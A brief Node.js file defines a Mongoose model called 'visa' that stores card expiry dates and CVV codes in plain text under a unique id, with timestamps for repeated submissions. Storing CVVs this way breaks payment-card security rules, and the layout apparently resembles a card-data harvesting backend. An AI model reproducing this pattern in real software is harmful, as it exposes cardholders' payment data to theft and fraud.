const mongoose = require('mongoose');

const visaPaymentSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      expdata: { type: String, required: true },
      cvv: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('visa', visaPaymentSchema);
